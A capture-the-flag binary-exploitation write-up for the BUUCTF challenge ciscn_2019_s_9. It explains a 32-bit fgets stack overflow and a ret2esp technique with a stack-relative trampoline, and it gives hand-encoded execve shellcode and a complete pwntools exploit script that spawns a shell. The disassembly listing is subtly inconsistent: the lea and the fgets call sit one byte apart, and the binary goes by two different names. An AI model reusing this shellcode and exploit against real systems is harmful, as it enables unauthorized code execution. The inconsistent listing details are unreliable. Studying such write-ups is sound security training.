# BUUCTF — ciscn_2019_s_9

## Stack Buffer Overflow → `jmp esp` → Stack-Relative Trampoline → Hand-Encoded Shellcode

| | |
|---|---|
| **Category** | Pwn / Binary Exploitation |
| **Architecture** | ELF32, Intel 80386, Linux |
| **Binary** | `cis` (not stripped, **with debug info** — symbol names below are the compiler's real names) |
| **Vulnerability** | Stack buffer overflow in `fgets()` |
| **Technique** | `ret2esp` via an existing `jmp esp`, then `sub esp,N / call esp` as a stack-relative trampoline, then execve-shellcode |
| **Goal** | Spawn `/bin/sh` |
| **Author:** Gantosay |

Everything in this write-up — addresses, strings, byte sequences — was re-derived directly from the supplied binary (`objdump`, `readelf`) so you can check every number yourself with the commands shown.

---

## 1. First look at the binary

```bash
$ file chall
chall: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically
       linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32,
       not stripped, with debug_info
```

### 1.1 Security properties


| Property | Evidence from the binary | Verdict |
|---|---|---|
| **Architecture** | `readelf -h`: `Machine: Intel 80386`, `Class: ELF32` | 32-bit x86 |
| **PIE** | `readelf -h` → `Type: EXEC` (not `DYN`) | **Disabled.** All addresses below are absolute and constant across runs. |
| **Stack canary** | `readelf --dyn-syms` has no `__stack_chk_fail`; `pwn()`'s epilogue is plain `mov eax,1 ; leave ; ret` with no canary check | **Disabled.** |
| **NX / executable stack** | `readelf -l` → `GNU_STACK ... RWE` (flags **R**ead **W**rite **E**xecute) | **Disabled** — the stack is executable. |
| **RELRO** | `readelf -l` shows a `GNU_RELRO` segment (so *something* is protected), but `readelf -d` has no `BIND_NOW` / `FLAGS_1 NOW` flag, and the `.plt`/`.got.plt` are lazily resolved | **Partial RELRO.** The GOT for already-resolved functions is read-only after relocation, but entries are still resolved lazily through the writable `.got.plt`. |

Commands used:

```bash
readelf -h cis | grep Type        # EXEC -> no PIE
readelf --dyn-syms cis | grep stack_chk   # (empty) -> no canary
readelf -l cis | grep GNU_STACK   # RWE -> NX disabled
readelf -d cis | grep -i bind     # (empty) -> no BIND_NOW -> partial RELRO
```

Three of these four properties directly enable the exploit:

* **No canary** → the saved return address can be overwritten without detection.
* **No PIE** → every address we need (`jmp esp`, the trampoline we build) is fixed and known ahead of time.
* **Executable stack** → code we write into the stack buffer can actually run.

### 1.2 Symbols

Because the binary carries debug info, `readelf -s` gives us the real function names and sizes directly — no guessing required:

```text
080484bb   150  FUNC  GLOBAL  pwn
08048551     8  FUNC  GLOBAL  hint
08048559    31  FUNC  GLOBAL  main
08048580    93  FUNC  GLOBAL  __libc_csu_init
```

`main` is 31 bytes and does nothing but call `pwn()` (see section 2 for its disassembly) — `hint` is never called by `main`; its only purpose is to exist in the binary so that its `jmp esp` instruction can be reused as a gadget.

---

## 2. `main`

```asm
08048559 <main>:
 8048559: lea    ecx,[esp+0x4]
 804855d: and    esp,0xfffffff0        ; 16-byte align the stack (SysV ABI)
 8048560: push   DWORD PTR [ecx-0x4]   ; re-push the original return address
 8048563: push   ebp
 8048564: mov    ebp,esp
 8048566: push   ecx
 8048567: sub    esp,0x4
 804856a: call   80484bb <pwn>
 804856f: add    esp,0x4
 8048572: pop    ecx
 8048573: pop    ebp
 8048574: lea    esp,[ecx-0x4]
 8048577: ret
```

This is the standard `-m32 -O0` prologue/epilogue pattern gcc emits to force 16-byte stack alignment at the call boundary (the `and esp,0xfffffff0` / `lea ecx,[esp+0x4]` dance), wrapped around a single call to `pwn()`. There is no return-value handling and no loop: the whole program is "call `pwn()` once, then exit."

---

## 3. `pwn()` — full disassembly and meaning

```asm
080484bb <pwn>:
 80484bb: push   ebp
 80484bc: mov    ebp,esp
 80484be: sub    esp,0x28                 ; 40-byte local frame

 ; ---- four prompt lines, each via puts() ------------------------------
 80484c1: sub    esp,0xc
 80484c4: push   0x8048600                ; "\nHey! ^_^"
 80484c9: call   8048390 <puts@plt>
 80484ce: add    esp,0x10

 80484d1: sub    esp,0xc
 80484d4: push   0x804860a                ; "\nIt's nice to meet you"
 80484d9: call   8048390 <puts@plt>
 80484de: add    esp,0x10

 80484e1: sub    esp,0xc
 80484e4: push   0x8048624                ; "\nDo you have anything to tell?"
 80484e9: call   8048390 <puts@plt>
 80484ee: add    esp,0x10

 80484f1: sub    esp,0xc
 80484f4: push   0x8048643                ; ">"
 80484f9: call   8048390 <puts@plt>
 80484fe: add    esp,0x10

 ; ---- fflush(stdout) ----------------------------------------------------
 8048501: mov    eax,ds:0x804a044         ; stdout
 8048506: sub    esp,0xc
 8048509: push   eax
 804850a: call   8048370 <fflush@plt>
 804850f: add    esp,0x10

 ; ---- the vulnerable read -----------------------------------------------
 8048512: mov    eax,ds:0x804a040         ; stdin
 8048517: sub    esp,0x4
 804851a: push   eax
 804851d: push   0x32                     ; size = 50
 8048520: lea    eax,[ebp-0x20]           ; dest = buffer (ebp-0x20)
 8048521: call   8048380 <fgets@plt>
 8048526: add    esp,0x10

 ; ---- closing text --------------------------------------------------------
 8048529: sub    esp,0xc
 804852c: push   0x8048645                ; "OK bye~"
 8048531: call   8048390 <puts@plt>
 8048536: add    esp,0x10

 8048539: mov    eax,ds:0x804a044         ; stdout
 804853e: sub    esp,0xc
 8048541: push   eax
 8048542: call   8048370 <fflush@plt>
 8048547: add    esp,0x10

 804854a: mov    eax,0x1                  ; return 1
 804854f: leave
 8048550: ret
```

### 3.1 Reconstructed source

With debug info and the extracted strings, the reconstruction is exact, not approximate:

```c
int pwn(void)
{
    char buf[32];                       // at ebp-0x20

    puts("\nHey! ^_^");
    puts("\nIt's nice to meet you");
    puts("\nDo you have anything to tell?");
    puts(">");
    fflush(stdout);

    fgets(buf, 0x32, stdin);            // 0x32 = 50 — the actual bug

    puts("OK bye~");
    fflush(stdout);
    return 1;
}
```

The earlier community write-ups of this challenge usually compress the whole function to `puts(">"); fgets(...)`. That is fine for exploitation purposes (only the prompt and the `fgets` call matter), but the real binary prints a small dialogue first — the program is roleplaying a chatty NPC before it reads your "anything to tell". The `>` prompt is exactly one character (`0x8048643`: `"> \0"` sits between `"...tell?\0"` and `"OK bye~\0"` in `.rodata`), confirming that sending data right after the literal byte `>` is the correct synchronization point for an exploit script (`sendlineafter(b'>', payload)`).

### 3.2 The actual bug

```c
fgets(buf, 0x32, stdin);
```

* `buf` is declared with only **32 bytes** (`char buf[32]`, confirmed by `lea eax,[ebp-0x20]` — 0x20 = 32).
* `fgets` is told it may write **0x32 = 50** bytes, i.e. up to 49 characters of input plus a terminating NUL.

`fgets` respects the *size argument it is given*, not the *real size of the buffer*. Since 50 > 32, up to 17 bytes beyond the intended buffer can be written — enough to reach the saved `EBP` (4 bytes) and the saved return address (4 bytes), with a little room to spare.

Unlike `gets()`, `fgets()` does stop at a newline and always NUL-terminates, so the overflow is bounded (max 49 visible bytes + 1 NUL) — but that bound is still larger than the destination, which is all that is needed here.

### 3.3 Why `sub esp, 0xc` before every call?

This is not padding related to the exploit; it's how unoptimised gcc keeps the stack 16-byte aligned before each `call` under the SysV i386 ABI convention used here: it reserves 12 extra bytes, pushes one 4-byte argument (12 + 4 = 16), calls, then undoes all 16 at once with `add esp,0x10`. It is boilerplate you will see before almost every library call in a `-O0` 32-bit gcc binary and can safely be ignored when reasoning about the vulnerability.

---

## 4. Computing the overflow offset

From the disassembly:

```text
buf        = ebp - 0x20      (0x20 = 32 bytes reserved for the buffer)
saved EBP  = [ebp + 0]       (4 bytes, pushed by the prologue's `push ebp`)
saved EIP  = [ebp + 4]       (4 bytes, pushed by the `call` instruction in main)
```

The distance from the **start of `buf`** to the **saved return address** is simply the size of everything in between:

```text
distance = size(buf) + size(saved EBP)
         = 32 + 4
         = 36                      (0x24)
```

So, counting bytes from the first byte we send:

```text
offset  0 .. 31   (32 bytes)  -> local buffer
offset 32 .. 35   ( 4 bytes)  -> saved EBP
offset 36 .. 39   ( 4 bytes)  -> saved EIP   <-- we control this
offset 40 ..      ( N bytes)  -> stack memory right after the return address
```

Anything we place at offset 40 onward ends up on the stack **immediately above** where the saved return address used to be — which, as section 6 explains, is exactly where `ESP` points the instant the overwritten return address is used.

---

## 5. The `jmp esp` gadget — `hint()`

```asm
08048551 <hint>:
 8048551: push   ebp
 8048552: mov    ebp,esp
 8048554: jmp    esp          ; <-- the instruction we want
 8048556: nop
 8048557: pop    ebp
 8048558: ret
```

`hint()` is never called anywhere in the program (confirmed: no `call` instruction in the whole `.text` section targets `0x8048551`). Its only job, as the name suggests, is to be a **hint** left by the challenge author: it contains a ready-made `jmp esp` at a fixed, known address.

```bash
objdump -d -M intel chall | grep -A2 '<hint>:'
```
```
08048551 <hint>:
 8048551: 55                    push   ebp
 8048552: 89 e5                 mov    ebp,esp
 8048554: ff e4                 jmp    esp
```

Bytes `ff e4` are the two-byte encoding of `jmp esp`. The instruction's address — **not the function's entry address** — is what we want:

```text
jmp esp  →  0x08048554
```

(The function `hint` starts at `0x08048551`; the `jmp esp` is 3 bytes into it, at `0x08048554`, after the `push ebp; mov ebp,esp` prologue. Overwriting the saved EIP with `0x08048551` would also run that harmless 2-instruction prologue before hitting the same `jmp esp`, so it would work too — but jumping directly to `0x08048554` skips two wasted instructions.)

Because PIE is disabled, this address is identical on every run of this exact binary.

---

## 6. Why `jmp esp` works here: tracing `ESP` through `leave`/`ret`

This is the part that actually requires understanding, rather than pattern-matching "found jmp esp, done".

### 6.1 The epilogue

```asm
804854f: leave
8048550: ret
```

`leave` is shorthand for:

```asm
mov esp, ebp
pop ebp
```

So right before `ret` executes, `ESP == (the address where the saved EIP is)` — i.e. `ESP` points at offset 36 of our buffer (using the layout from section 4). Then:

```asm
ret    ; pops [esp] into EIP, and ESP += 4
```

`ret` does two things: it loads `EIP` with the 4 bytes we placed at offset 36 (our forged address, `0x08048554`), **and** it advances `ESP` by 4 — past those 4 bytes. So immediately after `ret`:

```text
EIP = 0x08048554                (our forged address: the jmp esp gadget)
ESP = (buffer start) + 40        (one dword past where the return address was)
```

This is exactly the boundary worked out in section 4: offset 40 is "the stack memory right after the saved EIP", and that is precisely where `ESP` now points.

### 6.2 Arriving at `jmp esp`

CPU control now reaches `0x08048554`:

```asm
jmp esp
```

This instruction transfers control to **whatever address is currently in `ESP`** — not to a hardcoded value. Since we just computed `ESP == buffer + 40`, execution jumps there:

```text
EIP = buffer + 40
```

**This is the key idea of the whole technique:** we never needed to know the absolute stack address of our buffer (which can shift between environments, environment-variable sizes, etc.). We only needed to know *how far past the return address* our buffer's continuation sits — a value derived purely from the function's own stack layout, which is fixed by the compiled code, not by the OS or environment.

### 6.3 What goes at `buffer + 40`?

We get to choose the bytes there. If we simply put shellcode at offset 40, it would work on many challenges — but putting shellcode *immediately* after the return address, right where `jmp esp` lands, leaves very little room to work with (we'd have to fit everything within whatever stack space exists past our 45-byte input, which may be fragile or may not even be mapped the way we expect once libc's `fgets` internals have touched that memory).

The write-up's approach instead places a **tiny 5-byte trampoline** at offset 40 that redirects execution *backwards*, to offset 0 — the very start of our buffer, which is guaranteed to be fully under our control and large enough (32 bytes) for shellcode.

---

## 7. The stack-relative trampoline: `sub esp, 0x28` / `call esp`

```text
83 ec 28    sub esp, 0x28
ff d4       call esp
```

### 7.1 `sub esp, 0x28` (bytes `83 ec 28`)

Right when `jmp esp` lands us here:

```text
ESP = buffer + 40
```

`sub esp, 0x28` subtracts `0x28 = 40` (decimal) from `ESP`:

```text
ESP = (buffer + 40) - 40 = buffer
```

`ESP` now points exactly at the **first byte of our input buffer** — where the shellcode lives. Note this constant, 40, is not arbitrary: it is the same offset computed in section 4 (distance from buffer start to the position right after the saved EIP). The trampoline undoes exactly the displacement that `jmp esp` introduced.

### 7.2 `call esp` (bytes `ff d4`)

```asm
call esp
```

`call` with a register operand (`ff /2` encoding, here `d4` selects `esp` as the target register) does two things:

1. Pushes the address of the instruction *after* the `call` onto the stack (the normal return-address push).
2. Jumps to the value currently held in the operand register — here, `ESP` itself.

Since `ESP == buffer` at this point, execution jumps to `buffer`, i.e. the very first byte of shellcode we sent.

**Why does the pushed return address not clobber anything?** `call` pushes its return address *after* decrementing `ESP` by 4 — i.e. the return address lands at `buffer - 4`, which is **below** (at a lower address than) the start of the shellcode buffer, not inside it. It does not overwrite any of our injected bytes. (We never intend to return from the shellcode anyway, since it immediately calls `execve`.)

### 7.3 Full control-flow diagram

```text
pwn() returns
     |
     v
  leave            ; ESP -> points at saved-EIP slot (offset 36)
     |
     v
   ret             ; pop saved-EIP (0x08048554) into EIP, ESP += 4 (-> offset 40)
     |
     v
0x08048554:  jmp esp      ; EIP = ESP = buffer+40
     |
     v
buffer+40:  sub esp, 0x28 ; ESP = buffer+40-40 = buffer
buffer+43:  call esp      ; push retaddr @ buffer-4 ; EIP = ESP = buffer
     |
     v
buffer+0:   [ shellcode ]
```

This entire redirection — from the overwritten return address to running the first shellcode byte — uses only two fixed quantities:

* `0x08048554` (`jmp esp`, read directly from the binary), and
* `0x28` (40, a value computed purely from the vulnerable function's own stack layout — the distance from the return address to the buffer).

No ASLR bypass, no leaked stack address, and no hardcoded guess at where the stack "usually" sits was needed, which is what makes this more robust than naively writing the shellcode's address straight into the saved EIP (which *would* require knowing an absolute stack address).

---

## 8. The shellcode: `execve("/bin//sh", NULL, NULL)`

### 8.1 The target system call

32-bit Linux dispatches system calls through the legacy `int 0x80` interface with this register convention:

| Register | Role | Required value |
|---|---|---|
| `eax` | syscall number | `11` (`__NR_execve`) |
| `ebx` | arg1 — pointer to pathname | address of `"/bin/sh"` (or `"/bin//sh"`) |
| `ecx` | arg2 — `argv` | `NULL` |
| `edx` | arg3 — `envp` | `NULL` |

### 8.2 Assembly, with the reasoning for each instruction

```asm
push 0xb          ; 6a 0b
pop  eax          ; 58            -> eax = 11  (execve)
```
`push imm8` followed by `pop eax` is a 3-byte way to load a small constant into a register — shorter than `mov eax, 0xb` (which needs 5 bytes and, more importantly, contains the zero byte `0x00` three times, which would truncate the payload if it were ever delivered through a function like `strcpy` or typed through a terminal that treats NUL specially). Avoiding NUL bytes is a classic shellcoding concern.

```asm
cdq                ; 99            -> edx:eax = sign-extend(eax); since eax=11 (positive), edx = 0
```
`cdq` ("convert doubleword to quadword", despite the 32-bit-sounding name it is the 32→64 sign extension of `eax` into `edx:eax`) is a one-byte, NUL-free way to zero `edx`, because `eax` is known to be small and positive at this point. This gives us `envp = NULL` for free.

```asm
push edx           ; 52            -> push 0x00000000  (string NUL terminator)
```
This pushes 4 zero bytes onto the stack. Those bytes will serve as the NUL terminator for the path string we are about to build — again, without ever writing a literal `0x00` byte into our instruction stream.

```asm
push 0x68732f2f    ; 68 2f 2f 73 68     -> push "hs//"  (raw bytes, little-endian on stack)
push 0x6e69622f    ; 68 2f 62 69 6e     -> push "nib/"
```
x86 `push` writes the 4 bytes of its immediate operand in **little-endian** order into memory, so pushing the dword `0x68732f2f` places the bytes `2f 2f 73 68` at the new top of stack, i.e. the ASCII characters `/ / s h`. Doing this twice, in this order (because the stack grows *downward*, the *second* push ends up at the *lower* address, i.e. earlier in the string):

```text
after both pushes, reading upward from ESP:
  ESP+0 : '/','b','i','n'
  ESP+4 : '/','/','s','h'
  ESP+8 : 0,0,0,0            (from the earlier `push edx`)
```

Concatenated, this is the NUL-terminated C string `"/bin//sh\0"`. The double slash (`//`) is a deliberate, well-known shellcoding trick: `/bin//sh` is treated by the kernel exactly the same as `/bin/sh` (repeated slashes in a path are collapsed), but writing it this way lets the whole path fit into **two** 4-byte `push` immediates (8 characters) instead of needing a 7-character string plus awkward padding.

```asm
mov ebx, esp       ; 89 e3          -> ebx = pointer to the string we just built
```
`ESP` currently points at the first byte of `"/bin//sh\0"` because that is the last thing pushed. Copying it into `ebx` gives `execve` its first argument: the pathname pointer.

```asm
xor ecx, ecx       ; 31 c9          -> ecx = 0  (argv = NULL)
```
A standard NUL-free way to zero a register (`xor reg,reg` is always one of the shortest, most common idioms in shellcoding).

```asm
int 0x80           ; cd 80          -> invoke the syscall
```
Traps into the kernel. With `eax=11, ebx=&"/bin//sh", ecx=0, edx=0`, this is exactly `execve("/bin//sh", NULL, NULL)`, which replaces the current process image with a shell.

### 8.3 Full byte sequence (21 bytes, zero NUL bytes except the ones intentionally pushed onto the stack as string data — never in the instruction stream itself)

```text
6a 0b                   push 0xb
58                      pop  eax
99                      cdq
52                      push edx
68 2f 2f 73 68          push 0x68732f2f
68 2f 62 69 6e          push 0x6e69622f
89 e3                   mov  ebx, esp
31 c9                   xor  ecx, ecx
cd 80                   int  0x80
```

```text
length = 2+1+1+1+5+5+2+2+2 = 21 bytes
```

This is one of the most widely used, battle-tested 32-bit Linux `execve` shellcodes — its value here is not originality but that **every byte is accounted for and justified**, which is the entire point of building it by hand instead of calling `shellcraft.sh()`.

---

## 9. Manual opcode encoding instead of `asm()` / `shellcraft`

Pwntools can generate all of the above for you:

```python
shellcode = asm(shellcraft.sh())
```

The write-up deliberately avoids this and instead writes:

```python
shellcode  = bytes.fromhex('6a0b')         # push 0xb
shellcode += bytes.fromhex('58')           # pop eax
shellcode += bytes.fromhex('99')           # cdq
shellcode += bytes.fromhex('52')           # push edx
shellcode += bytes.fromhex('682f2f7368')   # push "//sh"
shellcode += bytes.fromhex('682f62696e')   # push "/bin"
shellcode += bytes.fromhex('89e3')         # mov ebx, esp
shellcode += bytes.fromhex('31c9')         # xor ecx, ecx
shellcode += bytes.fromhex('cd80')         # int 0x80
```

### 9.1 Why this is a legitimate (not just stylistic) choice

| Reason | Explanation |
|---|---|
| **No assembler dependency** | `asm()` shells out to (or embeds) a real assembler toolchain for the target architecture. If that toolchain is missing, mismatched, or misconfigured for the target triple, generation fails at exploit-build time, not at delivery time. Raw hex bytes have no such dependency. |
| **Determinism** | The exact bytes sent to the target are visible in the script itself. There's no "trust the assembler got this right" step — what you read is what gets sent. |
| **Auditability** | Anyone reviewing the exploit can map every byte to an instruction without re-running an assembler, which matters when a payload needs to be checked for forbidden bytes (e.g. no NUL, no newline, no space) before it is sent through something like `fgets`-driven input. |
| **Portability of the script itself** | The Python script has one fewer external moving part; it will produce byte-identical output on any machine with Python, regardless of what assembler (or version of one) happens to be installed. |

### 9.2 The honest limitation

Manually encoded bytes are **not inherently more reliable or portable than assembled ones** — they are the *same* machine code either way, just produced by a human instead of a toolchain. The real trade-off is: manual encoding requires the instruction sequence to already be correct and verified (as it is here, since this is a well-known shellcode), and a single transcription mistake (wrong opcode byte, wrong operand size, forgetting ModRM encoding rules) silently breaks the whole payload with no assembler to catch the mistake. It is a good technique when you already know exactly what you want; it is not a shortcut around understanding the instructions.

---

## 10. Assembling the full payload

```text
Offset   Size   Contents
------   ----   --------------------------------------------
  0       21    shellcode (section 8)
 21       11    padding, 0x90 (NOP) bytes, up to the 32-byte buffer boundary
 32        4    saved EBP overwrite (arbitrary — never used after the exploit)
 36        4    saved EIP overwrite = p32(0x08048554)      ("jmp esp")
 40        3    trampoline part 1: 83 ec 28   (sub esp, 0x28)
 43        2    trampoline part 2: ff d4      (call esp)
------   ----
 total    45 bytes
```

* **Padding (offset 21–31):** `0x90` is the one-byte `nop` instruction. It is not strictly required here since execution never lands in the middle of the padding by accident (control arrives at offset 0 exactly, via `call esp`), but it is harmless, conventional, and gives a small safety margin if the shellcode length were ever adjusted.
* **Saved EBP (offset 32–35):** this value is never read as a pointer or dereferenced after our takeover — `pwn()` never legitimately returns, so whatever garbage frame pointer ends up here is irrelevant. `b'BBBB'` is just a readable placeholder.
* **Saved EIP (offset 36–39):** must be exactly `p32(0x08048554)` — a 32-bit little-endian encoding of the `jmp esp` address, since the target is 32-bit and the architecture is little-endian (`p32` from pwntools does exactly this; without pwntools, `struct.pack('<I', 0x08048554)` is the equivalent).
* **Trampoline (offset 40–44):** `sub esp, 0x28 ; call esp`, exactly as derived in section 7.

Total length: **45 bytes**, well inside the 49 usable bytes that `fgets(buf, 0x32, stdin)` (50 - 1 for the NUL `fgets` always appends) allows. The remaining 4 bytes of headroom plus the newline that `sendline` appends are not transmitted as part of the controlled 49, which is why `fgets` happily reads our whole payload if it's delivered as a single line terminated by `\n`.

---

## 11. Complete exploit script

```python
from pwn import *

# ==========================================================================
# Configuration
# ==========================================================================
context.clear(arch='i386', os='linux')
context.log_level = 'info'

MODE   = 'local'          # 'local' or 'remote'
BINARY = './cis'

HOST = 'f0a9419804451a406184a04a.tcp-ctf2.dasctf.com'   # fill in for remote
PORT = 9999

JMP_ESP = 0x08048554             # hint() + 3 : "jmp esp"   (ff e4)

# ==========================================================================
# Stage 1 — hand-encoded execve("/bin//sh", NULL, NULL) shellcode (21 bytes)
# ==========================================================================
shellcode  = bytes.fromhex('6a0b')         # push 0xb
shellcode += bytes.fromhex('58')           # pop  eax           ; eax = 11 (execve)
shellcode += bytes.fromhex('99')           # cdq                ; edx = 0
shellcode += bytes.fromhex('52')           # push edx           ; push NUL terminator
shellcode += bytes.fromhex('682f2f7368')   # push 0x68732f2f    ; "//sh"
shellcode += bytes.fromhex('682f62696e')   # push 0x6e69622f    ; "/bin"
shellcode += bytes.fromhex('89e3')         # mov  ebx, esp      ; ebx = "/bin//sh"
shellcode += bytes.fromhex('31c9')         # xor  ecx, ecx      ; ecx = NULL
shellcode += bytes.fromhex('cd80')         # int  0x80          ; execve()

assert len(shellcode) == 21

# ==========================================================================
# Stage 2 — buffer padding + saved EBP
# ==========================================================================
payload  = shellcode.ljust(32, b'\x90')    # pad shellcode up to the 32-byte buffer
payload += b'BBBB'                         # saved EBP (unused, any 4 bytes)

# ==========================================================================
# Stage 3 — saved return address -> jmp esp
# ==========================================================================
payload += p32(JMP_ESP)

# ==========================================================================
# Stage 4 — stack-relative trampoline: sub esp,0x28 ; call esp
# ==========================================================================
payload += bytes.fromhex('83ec28')         # sub esp, 0x28
payload += bytes.fromhex('ffd4')           # call esp

assert len(payload) == 45

log.info(f'shellcode length : {len(shellcode)}')
log.info(f'payload length   : {len(payload)}')

# ==========================================================================
# Connect
# ==========================================================================
if MODE == 'local':
    io = process(BINARY)
elif MODE == 'remote':
    io = remote(HOST, PORT)
else:
    raise ValueError('Invalid MODE')

# ==========================================================================
# Deliver and interact
# ==========================================================================
io.sendlineafter(b'>', payload)
io.interactive()
```

Running it should reach the point where `fgets` has consumed the 45-byte line (plus the newline `sendlineafter`/`sendline` appends), the program prints `OK bye~`, returns from `pwn()`, and instead of crashing or returning to `main`, executes the trampoline and drops into the shellcode, replacing the process with `/bin/sh`.

---

## 12. Sanity checks you can run yourself

```bash
# Confirm the gadget address and bytes:
objdump -d -M intel cis | grep -A3 '<hint>:'
#   8048551: 55          push ebp
#   8048552: 89 e5       mov  ebp,esp
#   8048554: ff e4       jmp  esp        <- must be 0x08048554, bytes ff e4

# Confirm the buffer offset:
objdump -d -M intel cis | grep -A20 '<pwn>:' | grep -E 'sub.*esp,0x28|lea.*ebp-0x20|fgets'
#   sub esp,0x28          -> frame size
#   lea eax,[ebp-0x20]    -> buffer at ebp-0x20  (32 bytes to saved EBP, +4 more to saved EIP = 36)
#   call fgets@plt

# Confirm there is no canary and no PIE:
readelf --dyn-syms cis | grep stack_chk   # expect: no output
readelf -h cis | grep Type                # expect: EXEC
readelf -l cis | grep GNU_STACK           # expect: ...RWE...
```

---

## 13. Final analysis

The vulnerability itself — `fgets(buf, 0x32, stdin)` writing up to 50 bytes into a 32-byte buffer — is almost the simplest possible stack overflow. The interesting engineering is entirely in what happens *after* `EIP` is hijacked:

```text
leave                 (ESP -> saved-EIP slot)
ret                    (EIP = jmp-esp gadget ; ESP += 4)
jmp esp               (EIP = ESP = buffer + 40)
sub esp, 0x28         (ESP = buffer)
call esp              (EIP = ESP = buffer  -> shellcode runs)
```

The whole redirection is expressed as **two fixed inputs**: the address of an existing `jmp esp` instruction (read directly out of the binary, made reusable here only because PIE is disabled) and a single stack-relative offset (`0x28`, derived purely from the vulnerable function's own frame layout — the gap between the saved return address and the start of the buffer). No absolute stack address was ever hardcoded or guessed, which is what makes `ret2esp` with a small trampoline noticeably more portable across environments than a naive "point EIP straight at a stack address" approach — the trampoline tolerates the buffer living anywhere on the stack, as long as `ESP` lands where `leave`/`ret` leave it relative to that buffer, which is guaranteed by the function's own compiled layout rather than by the OS.

The shellcode itself contributes a second, independent lesson: every one of its 21 bytes can be tied back to a specific register-setup requirement of the `execve` system call, and the whole sequence was chosen (`push`/`pop` instead of `mov`, `cdq` instead of `xor edx,edx` after `mov eax,11`, `//sh` instead of `/sh`) specifically to avoid embedding a NUL byte anywhere in the instruction stream — a constraint that matters whenever delivery goes through a string-oriented input function, as `fgets` is here.

**The core lesson of this challenge:** finding a `jmp esp` gadget is the easy part; correctly tracing what `ESP` is equal to at each step after `ret` — and designing a tiny trampoline around that value instead of around a guessed absolute address — is what actually makes the exploit work reliably.
